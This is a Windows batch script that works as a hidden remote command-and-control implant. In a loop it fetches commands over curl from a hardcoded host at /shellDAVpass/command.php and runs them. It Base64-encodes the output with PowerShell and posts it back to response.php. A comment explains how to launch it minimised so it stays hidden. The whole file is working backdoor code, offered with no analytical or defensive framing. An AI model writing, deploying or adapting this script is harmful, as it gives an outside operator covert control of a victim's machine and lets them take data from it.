@echo off
setlocal EnableDelayedExpansion

REM To launch it hidden, run the next command
REM START /MIN CMD.EXE /C CURRENTFILE.BAT

SET IPADDRESS=10.211.55.11
SET PORT=2030
SET DELAY=5

:START
	FOR /F "tokens=* delims=" %%I IN ('curl -s !IPADDRESS!:!PORT!/shellDAVpass/command.php') DO (SET COMMAND=%%I)

	IF [!COMMAND!]==[] (GOTO BACK) ELSE (GOTO SendTheCommand)

:SendTheCommand
	SET "OUTPUT="
	FOR /F "delims=" %%F in ('!COMMAND!') do (
    	if defined OUTPUT set "OUTPUT=!OUTPUT!~"
   	 set "OUTPUT=!OUTPUT!%%F"
	)
	SET OUTPUT64=PowerShell [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("'!OUTPUT!'"))
	FOR /F "tokens=* delims=" %%C IN ('!OUTPUT64!') DO (SET OUTPUT64SEND=%%C)
	curl -s !IPADDRESS!:!PORT!/shellDAVpass/response.php -X POST -d "!OUTPUT64SEND!"

:BACK
	SET "COMMAND="
	SET "OUTPUT="
	SET "OUTPUT64="
	SET "OUTPUT64SEND="
	timeout !DELAY! /nobreak
	GOTO START

endlocal
